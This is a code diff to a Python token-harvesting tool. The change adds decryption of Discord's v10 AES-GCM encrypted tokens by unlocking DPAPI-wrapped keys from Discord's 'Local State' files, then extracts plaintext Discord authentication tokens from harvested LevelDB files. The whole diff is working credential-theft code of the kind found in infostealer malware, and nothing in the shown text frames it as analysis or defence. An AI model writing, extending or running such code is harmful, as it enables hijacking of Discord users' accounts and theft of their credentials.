@@ -650,8 +650,25 @@ APP_TOKEN = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
 APP_SIG = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11"
 
 
+def discord_aes_keys(harvest, keyring):
+    """v10 Discord tokens use the DPAPI-wrapped key in the sibling Local State."""
+    keys = []
+    for state in harvest.rel("Local State"):
+        parts = [part.lower() for part in state.parts]
+        if "discord" not in parts and "discordcanary" not in parts and "discordptb" not in parts:
+            continue
+        try:
+            key = unlock_local_state(None, state, keyring)
+        except Exception:
+            key = None
+        if key:
+            keys.append(key)
+    return keys
+
+
 def find_tokens(harvest, keyring):
     found = []
+    aes_keys = discord_aes_keys(harvest, keyring)
     for dump in harvest.rel("*.ldb") + harvest.rel("*.log"):
         try:
             data = dump.read_bytes()
@@ -662,12 +679,21 @@ def find_tokens(harvest, keyring):
                 blob = base64.b64decode(match.group(1))
             except Exception:
                 continue
+            plain = b""
             index = blob.find(APP_SIG)
-            if index < 0:
-                continue
-            try:
-                plain = unprotect(blob[index:], keyring)
-            except Exception:
+            if index >= 0:
+                try:
+                    plain = unprotect(blob[index:], keyring)
+                except Exception:
+                    plain = b""
+            elif blob[:3] == b"v10":
+                for key in aes_keys:
+                    try:
+                        plain = AESGCM(key).decrypt(blob[3:15], blob[15:], None)
+                        break
+                    except Exception:
+                        continue
+            if not plain:
                 continue
             for token in re.findall(rb"[MN][A-Za-z\d]{23,}\.[\w-]{6,}\.[\w-]{25,}", plain):
                 found.append(token.decode())
